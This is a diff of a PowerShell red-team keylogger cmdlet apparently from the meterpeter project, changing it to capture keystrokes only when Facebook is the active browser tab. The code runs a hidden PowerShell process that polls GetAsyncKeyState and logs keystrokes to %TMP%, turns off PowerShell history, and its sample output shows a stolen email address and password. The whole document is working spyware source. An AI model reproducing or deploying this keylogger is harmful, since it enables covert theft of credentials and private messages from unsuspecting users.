@@ -9,20 +9,19 @@
    PS cmdlet Dev version: v1.1.8
    
 .DESCRIPTION
-   Capture target keyboard keystrokes if facebook or
-   twitter is open in web browser (browser active tab)
+   Capture keyboard keystrokes if facebook is open (browser tab)
 
 .NOTES
    Browsers supported:MsEdge,Chrome,Chromium,Opera,Safari,Firefox
    The logfiles will be saved under target %TMP% directory under
-   the name [randomName].Facebook or [randomName].Twitter extension
+   the name [void].log or [randomName].meterpeter extension logs
 
-   Cmdlet only starts recording keystrokes if facebook or twitter
-   its active on browser tab, and it stops is execution if target
-   switchs from social media to another site or closes browser, it
-   resume capture if social media is accessed again. (active tab)
+   Cmdlet only starts recording keystrokes if facebook its active
+   on browser tab, and it stops is execution if user switchs from
+   social media to another site or closes browser. it also resumes
+   capture if social media is accessed again. (browser active tab)
 
-   1000 milliseconds (default) its the amont of time required for
+   1200 milliseconds (default) its the amont of time required for
    key`loger to start execution and build pid.log file. If we chose
    to use less than 1 second delay then cmdlet executes more than
    one instance of powershell (all PIDs will be stoped in the end)
@@ -32,7 +31,7 @@
    Start or Stop key`logger (default: start)
 
 .Parameter Delay
-   Milliseconds delay between loops (default: 1000)
+   Milliseconds delay between loops (default: 1200)
 
 .Parameter Force
    Switch to bypass Is_Browser_Active? checks
@@ -68,30 +67,27 @@
    None. You cannot pipe objects into SocialMedia.ps1
 
 .OUTPUTS
-   * Social media key`logger
+   * Facebook key`logger
 
-   Social Media: Facebook
-   Logfile: sdfsrs.Facebook
+   Logfile: sdfsrs.meterpeter
    ----------------------------
    Annoyed_Wife@hotmailcom
    s3cr3t_bitCh_p4ss
    ----------------------------
 
-   Social Media: Facebook
-   Logfile: soimui.Facebook
+   Logfile: soimui.meterpeter
    ----------------------------
    hello chad, are you here? :P
    ----------------------------
 
 .LINK
-   https://github.com/r00t-3xp10it/redpill
    https://github.com/r00t-3xp10it/meterpeter
 #>
 
 
 [CmdletBinding(PositionalBinding=$false)] param(
    [string]$Action="start",
-   [int]$Delay='1000',
+   [int]$Delay='1200',
    [switch]$AutoDel,
    [switch]$Force
 )
@@ -104,7 +100,7 @@ Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
 $host.UI.RawUI.WindowTitle = "@SocialMedia $CmdletVersion {SSA@RedTeam}"
 If(-not($AutoDel.IsPresent))
 {
-   write-host "`n* Social media key`logger" -ForegroundColor Green
+   write-host "`n* Facebook key`logger" -ForegroundColor Green
 }
 
 ## Browser names
@@ -119,8 +115,8 @@ $BrowserNames = @(
 
 $RawCmdlet = @("function Keystrokes(){
 [int]`$totalNumber = 0
-`$Path = `"`$Env:TMP\void.log`"
 echo `$pid >> `$Env:TMP\pid.log ## Store Process PID to be abble to stop it later!
+`$Path = `"`$Env:TMP\void.log`"
 `$signatures = @'
 [DllImport(`"user32.dll`", CharSet=CharSet.Auto, ExactSpelling=true)] 
 public static extern short GetAsyncKeyState(int virtualKeyCode); 
@@ -170,7 +166,6 @@ Keystrokes")
 
 If($Action -iMatch '^(start)$')
 {
-   $TestBrowsers = $BrowserNames
    ## Build mscore.ps1 cmdlet in %TMP%
    echo $RawCmdlet|Out-File "$Env:TMP\mscore.ps1" -Encoding string -Force
 
@@ -200,6 +195,10 @@ If($Action -iMatch '^(start)$')
          return ## Exit cmdlet execution (default)
       }
    }
+   Else
+   {
+      $TestBrowsers = $BrowserNames
+   }
 
 
    echo ""
@@ -218,25 +217,20 @@ If($Action -iMatch '^(start)$')
          $FilterEdge = (Get-Process -Name "$Item").MainWindowHandle|Where-Object{$_ -NotMatch '^(0)$'}
          If(-not([string]::IsNullOrEmpty($FilterEdge)))
          {
-            ## Get browser Main Window Title (active tab)
             $StartKeys = (Get-Process -Name "$Item").MainWindowTitle|Where-Object{$_ -NotMatch '^(0)$'}|Where-Object{$_ -ne ''}
-            If(($StartKeys -iMatch 'Facebook') -or ($StartKeys -iMatch '/ X |Twitter.com'))
+            If($StartKeys -iMatch 'Facebook')
             {
-               If($StartKeys -imatch 'Facebook'){$SocialSite = "Facebook"}
-               If($StartKeys -imatch '/ X |twitter.com'){$SocialSite = "Twitter"}
-
-               ## If pid.log does not exist = Start process
                If(-not(Test-Path -Path "$Env:TMP\pid.log"))
                {
                   ## Print info onscreen
                   write-host "`n   Browser Name    : $Item"
-                  write-host "   Social Media    : $SocialSite"            
+                  write-host "   Social Media    : Facebook"            
                   write-host "   Logfile         : " -NoNewline
                   write-host "$Env:TMP\void.log`n" -ForegroundColor Green
 
                   ## Execute key`logger in a hidden windows console detach from parent process
                   Start-Process -WindowStyle Hidden powershell -ArgumentList "-file $Env:TMP\mscore.ps1"
-                  Start-Sleep -Milliseconds 350 # Give extra time for execution
+                  Start-Sleep -Milliseconds 1700 # Give extra time for execution
                }
                write-host "   > key`logger running in background!"
             }
@@ -262,18 +256,19 @@ If($Action -iMatch '^(start)$')
 
                   If(Test-Path -Path "$Env:TMP\void.log")
                   {
-                     ## Random FileName generation - rename logfile [name+extension]
-                     # This allows attackers to stop key`logger if target its not on social media
+                     ## Random FileName generation
+                     # This allows attackers to stop key`logger if target its not on facebook
                      $Rand = -join (((48..57)+(65..90)+(97..122)) * 80 |Get-Random -Count 6 |%{[char]$_})
-                     Move-Item -Path "$Env:TMP\void.log" -Destination "$Env:TMP\${Rand}.${SocialSite}" -Force
+                     Rename-Item -Path "$Env:TMP\void.log" -NewName "$Env:TMP\$Rand.meterpeter" -Force
 
                      ## Print info onscreen
                      write-host "   > logfile: " -NoNewline
                      write-host "void.log" -ForegroundColor Yellow -NoNewline
                      write-host " renamed to: " -NoNewline
-                     write-host "${Rand}.${SocialSite}" -ForegroundColor Yellow
+                     write-host "$Rand.meterpeter" -ForegroundColor Yellow
 
                      ## CleanUP
+                     Remove-Item -Path "$Env:TMP\void.log" -Force
                      Remove-Item -Path "$Env:TMP\pid.log" -Force
                   }
                }
@@ -308,25 +303,22 @@ If($Action -iMatch '^(stop)$')
       }
    }
 
-
    ## Get the KeyStrokes from logfiles
-   $GetLogNames = (dir $Env:TMP).Name|findstr /C:'.Facebook' /C:'.Twitter' /C:'void.log'
+   $GetLogNames = (dir $Env:TMP).Name|findstr /C:'.meterpeter' /C:'void.log'
    If(-not([string]::IsNullOrEmpty($GetLogNames)))
    {
       ForEach($Report in $GetLogNames)
-      {
-         ## Extract social media names from extensions
-         $SocialSite = ($Report).split('.')[1]
-         write-host "`nSocial Media: $SocialSite"      
-         write-host "Logfile: $Report"
-         write-host "----------------------------"
+      {   
+         write-host "`nLogfile: $Report"
+         write-host "----------------------------" 
          Get-Content -Path "$Env:TMP\${Report}" -EA SilentlyContinue
          Remove-Item -Path "$Env:TMP\${Report}" -Force
-         write-host "----------------------------`n"   
+         write-host "----------------------------`n"            
       }
 
       ## CleanUP
-      Remove-Item -Path "$Env:TMP\*.log" -Force
+      Remove-Item -Path "$Env:TMP\void.log" -Force
+      Remove-Item -Path "$Env:TMP\pid.log" -Force
    }
    Else
    {
@@ -336,7 +328,7 @@ If($Action -iMatch '^(stop)$')
 
 
 ## CleanUP
-Remove-Item -Path "$Env:TMP\*.log" -Force
+Remove-Item -Path "$Env:TMP\pid.log" -Force
 Remove-Item -Path "$Env:TMP\mscore.ps1" -Force
 
 
